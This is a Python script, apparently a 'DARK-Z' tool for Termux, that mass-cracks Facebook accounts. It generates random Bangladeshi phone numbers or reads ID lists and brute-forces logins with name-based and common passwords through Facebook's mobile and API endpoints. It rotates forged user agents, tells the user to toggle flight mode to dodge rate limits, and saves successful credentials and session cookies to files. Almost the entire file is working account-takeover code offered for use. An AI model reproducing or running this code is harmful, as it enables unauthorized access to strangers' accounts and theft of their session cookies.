import uuid
import string
from os import path
from urllib.request import urlopen
import os
import time
import re
import random
import sys
import subprocess
import platform
import base64
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import getpass
#------------------[ DARK-COLORS ]-------------------#
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
#------------------[ DARK-INTRO ]-------------------#
def clear():
    os.system('clear')
#------------------[ DARK-INTRO ]-------------------#
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update... ')
time.sleep(1)
os.system("git pull")
os.system('clear')
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mInstalling modules... ')
time.sleep(1)
os.system("pkg install espeak")
os.system("pip install requests")
os.system("pip install rich")
os.system("pip install bs4")
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN OUR FACEBOOK GROUP")
time.sleep(1)
os.system(f'xdg-open https://www.facebook.com/groups/2477016825771219')
print()
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY GITHUB ACCOUNT")
time.sleep(1)
os.system(f'xdg-open https://github.com/coderet-d-looper')
print()
attemps = 0
while attemps < 12345677901:
    username = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter username: ')
    password = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter password: ')

    if username == 'E' and password == 'X':
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mLOGIN SUCCESSFULLY.....')
        os.system('espeak -a 300 " Login, Successfull"')
        time.sleep(2)
        break
    else:
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;91mIncorrect Please Trying ')
        time.sleep(2)
        attemps += 1
        continue

os.system('clear')

try:
    import requests
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python Dark.py')

#------------------[ DARK-USERAGENT ]-------------------#
ugen = []
for fucker in range(20000):
    a='Mozilla/5.0 (Windows NT'
    b=random.choice(['6.1','6.2','6.3','6.5','10.1','10.5','10.6','11.0','10.2','10.3','10.0'])
    model='Win64; x64)'
    c='AppleWebKit/'
    p='537'
    q='36'
    r='(KHTML, like Gecko) Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(100,200)
    h='Mobile Safari/'
    i='537'
    j='36'
    uagent=f'{a} {b}; {model}{c}{p}.{q}{r}{d}.{e}.{f}.{g} {h}{i}.{j}'
    ugen.append(uagent)

for fucker in range(20000):
    a='Mozilla/5.0 (Windows; Windows NT'
    b=random.choice(['6.1','6.2','6.3','6.5','10.1','10.5','10.6','11.0','10.2','10.3','10.0'])
    model='Win64; x64)'
    c='AppleWebKit/'
    p=random.randrange(533,602)
    q='38'
    r='(KHTML, like Gecko) Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(100,200)
    h='Safari/'
    i=random.randrange(533,602)
    uagent=f'{a} {b}; {model}{c}{p}.{q}{r}{d}.{e}.{f}.{g} {h}{i}'
    ugen.append(uagent)

#------------------[ DARK-LOGO ]-------------------#
logo = ("""

██████╗░░█████╗░██████╗░██╗░░██╗        ███████╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝        ╚════██║
██║░░██║███████║██████╔╝█████═╝░        ░░███╔═╝
██║░░██║██╔══██║██╔══██╗██╔═██╗░        ██╔══╝░░
██████╔╝██║░░██║██║░░██║██║░╚██╗        ███████╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝        ╚══════╝

\033[1;91m\033[1;41m\033[1;97m              Be you, The world will adjust               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[👨] AUTHOR    :\033[1;32m DARK X FUZED 
\033[1;32m[📖] GITHUB    :\033[1;32m CODERET-D-LOOPER
\033[1;32m[😇] FACEBOOK  :\033[1;32m FIRDAWS SAPNO
\033[1;32m[💉] TOOLS     :\033[1;32m PREMIUM
\033[1;32m[📅] VERSION   :\033[1;32m 3.9 [DEXA-H]
\033[1;32m[🚀] STATUS    :\033[1;32m WORKING
\033[1;32m[⏳] UPDATE    :\033[1;32m EVERYDAY AT 12.00AM
\033[1;91m<═══\033[1;41m\033[1;97m WORKING ONLY ON MOBILE DATA\033[;0m\033[1;91m═══>\033[1;92m
\033[1;92m══════════════════════════════════════════""")

def linex():
    print('\033[1;92m══════════════════════════════════════════')

def clear():
    os.system('clear')
    print(logo)


loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
#------------------[ DARK-MENU ]-------------------#
def menu():
    try:
        clear()
        if 1 == 1:
            clear()
            os.system('espeak -a 300 " Welcome,   to,  DARK,  Z,  Tools"')
            print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
            print('\033[1;37m[01] FILE CLONING [OFF]\n\033[1;37m[02] RANDOM CLONING [WORKING]\n\033[1;37m[03] VISIT MY ACCOUNT\n\033[1;37m[04] CLOSE TOOL')
            print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
            xd = input('\033[1;37m[💥] CHOOSE : ')
            if xd in ['1', '01']:
                clear()
                os.system('espeak -a 300 " Enter, your, file , name"')
                print('\033[1;32m[PUT FILE EXAMPLE:  /sdcard/DARK.txt  Etc...]')
                file = input('\033[1;37m[📂] INPUT FILE NAME: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    os.system('espeak -a 300 " File, location, not, found"')
                    print('[❌] FILE LOCATION NOT FOUND [❌]')
                    time.sleep(1)
                    menu()
                clear()
                print('\033[1;32m[1] METHOD 1 [NOT WORKING]\n[2] METHOD 2 [WORKING]')
                os.system('espeak -a 300 " Choose, method, for, cloning"')
                linex()
                mthd = input('\033[1;32m[+] CHOOSE : ')
                linex()
                plist = []
                print('\033[1;37m           SELECT CRACK MENU')
                linex()
                print('[1] AUTO PASSWORD [BEST]\n[2] MANUAL PASSWORD')
                linex()
                ppp = input('\033[1;32m[+] CHOOSE : ')
                if ppp in ['1', '01']:
                    plist.append('first last')
                    plist.append('first')
                    plist.append('firstlast')
                    plist.append('first12')
                    plist.append('first123')
                    plist.append('first1234')
                    plist.append('first12345')
                    plist.append('first123456')
                    plist.append('first11')
                    plist.append('first111')
                    plist.append('first1122')
                    plist.append('first112233')
                    plist.append('first@')
                    plist.append('first@@')
                    plist.append('first@@@')
                    plist.append('first@@@@')
                    plist.append('i love you')
                    plist.append('last')
                    plist.append('last12')
                    plist.append('last123')
                    plist.append('last1234')
                    plist.append('last12345')
                    plist.append('last123456')
                    plist.append('last@')
                    plist.append('last@@')
                    plist.append('last@@@')
                    plist.append('last@@@@')
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(' HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
                    except:
                        ps_limit = 15
                    linex()
                    print('\033[1;32m EXAMPLE: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(
                            input(f'\033[1;32m[+] PUT PASSWORD {i+1}: '))
                linex()
                print('[🍬]SHOW CP ACCOUNT? (Y/n): ')
                linex()
                cx = input(' CHOOSE: ')
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=50) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('[🧮] TOTAL ID : \033[1;32m'+total_ids)
                    print("\033[1;35m[🚄] CRACKING SPEED - FAST✅ ")
                    print("\033[1;33m[🔍] CRACKING HAS BEEN STARTED")
                    linex()
                    print("""\033[1;91m<═══\033[1;41m\033[1;97m ✈ USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m═══>\033[1;92m""")
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(ffb, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(api, ids, names, passlist)
                print('\033[1;37m')
                linex()
                os.system('espeak -a 300 " Cracking, has, completed"')
                print('[😘]CRACKING HAS COMPLETED')
                print('[🔰]Total OK/CP/2F: '+str(len(oks)) +
                      '/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                os.system('espeak -a 300 " press, enter, for, main, menu"')
                input('[👉]PRESS ENTER FOR MAIN MENU[👈]')
                os.system('python Dark.py')
            elif xd in ['3', '03']:
                os.system(' xdg-open https://www.facebook.com/coderet.d.looper')
                menu()
            elif xd in ['4', '04']:
                exit('BYE BYE Tata Gaya')
            elif xd in ['2', '02']:
                clear()
                print(
                    ' [1] Bangladesh cloning \n [0] Back menu')
                linex()
                x = input(' Choose: ')
                if x in ['1', '01']:
                    bd()
                if xd in ['0', '00']:
                    menu()
            else:
                exit(' Option not found in menu...')
        else:
            print(' Run :  python Dark.py')
            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()

def bd():
    user = []
    clear()
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    os.system('espeak -a 300 " Welcome, to, random, cloning, tool"')
    print(" BD SIM CODE=><>< 017,018,019,014,013,015")
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    os.system('espeak -a 300 " Enter, sim ,code"')
    code = input('[📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(1))
    koder = ''.join(random.choice(string.digits) for _ in range(1))
    kod = ''.join(random.choice(string.digits) for _ in range(1))
    kode = ''.join(random.choice(string.digits) for _ in range(1))
    kodem = ''.join(random.choice(string.digits) for _ in range(1))
    kodey = ''.join(random.choice(string.digits) for _ in range(1))
    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(2))
        user.append(nmp)
    with ThreadPool(max_workers=50) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;33m[♥]  TOTAL IDS :\033[1;92m ' + tl)
        print( "\033[1;33m[♥]  YOUR TARGET CRACK MENU:\033[1;92mRANDOM CLONING")
        print('\033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
        print(f"\033[1;33m[♥]  CHOOSEN SIM CODE:\033[1;92m {code}")
        print("""\033[1;91m\033[1;41m\033[1;97m USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m\033[1;92m""")
        print(50 * '_')
        for guru in user:
            uid = code + kodex + koder + kod + kode + kodem + kodey + guru
            pwx = [code + kodex + koder + kode, code + kodex + koder + kod + kode, code + kodex + koder + kod + kode + kodem, code + kodex + koder + kod + kode + kodem + kodey, code + kodex + koder + kod + kode + kodem + kodey + guru, guru + kodey + kodem + kode + kod, guru + kodey + kodem + kode + kod + koder, guru + kodey + kodem + kode + kod + koder + kodex, 'Bangladesh', 'i love you', '111222', 'hridoy', 'shahin', 'sadiya', 'fariya', 'fatema', 'nadiya', 'password', '102030', '203040', '304050', '405060', '506070', '607080', '708090', '222333', '333444', '444555', '112233']
            yaari.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global prox
    try:
        for ps in pwx:
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\33[1;94m[\033[1;37mDARK-Z\33[1;94m][\033[1;37m%s\33[1;94m/\033[1;37m%s\33[1;94m]\33[1;94m[\033[1;32mOK-%s\33[1;94m]\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
           'method': 'GET',
           'path': '/',
           'scheme': 'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',
           'dpr': '3',
           'sec-ch-prefers-color-scheme': 'dark',
           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
           'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.70"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-model': '"Infinix X676C"',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '"12.0.0"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': pro,
           'viewport-width': '980',}
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[DARK-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[COOKIES🌺] • \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/RANDOM-OK.txt', 'a').write(uid+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[DARK-CP💔] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                os.system('espeak -a 300 " CP"')
                open('/sdcard/RANDOM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            elif twf in log_cookies:
                print('\r\r\33[1;30m[DARK-2F🔒] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                os.system('espeak -a 300 " two, factor"')
                open('/sdcard/RANDOM-2F.txt', 'a').write( uid+' | '+ps+' \n')
                break
            else:
                continue
        loop+=1
    except:pass

def ffb(ids, names, passlist):
    global loop, oks, cps
    bi = random.choice([A,B,C,D,E,F,G,H])
    sys.stdout.write(f'\r\033[1;31m[%sDARK-M1\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop, len(oks)))
    sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Islam'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace(
                'Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            nip=random.choice(prox)
            prox= {'http': 'socks4://'+nip}
            head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass = {"lsd": re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1), "uid": ids, "next": "https://free.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": pas,}
            complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass, allow_redirects=False, headers=head)
            Aking = session.cookies.get_dict().keys()
            if "c_user" in Aking:
                print("")
                print('\r\r\033[1;37m[Dark-OK💚] %s | %s' % (ids, pas))
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in session.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in Aking:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1


def api(ids, names, passlist):
    try:
        global loop, oks, cps
        bi = random.choice([A,B,C,D,E,F,G,H])
        sys.stdout.write(f'\r \033[1;31m[%sDARK-M2\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop, len(oks)))
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            pro1 = random.choice(ugen)
            ses = requests.Session()
            headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": pro1, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"}
            po = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(ids)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            if 'session_key' in po and "EAAA" in po:
                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\r\033[1;97m[\033[1;96mDARK-OK💚\033[1;97m]\033[1;92m '+ids+' • '+pas+'\n\033[0;93m[🌺]= COOKIES • \033[0;92m '+coki+' ')
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(cid)
                break
            elif twf in po:
                    print()
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop += 1
    except Exception as e:
        pass
try:

    menu()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
except Exception as e:
    print(e)
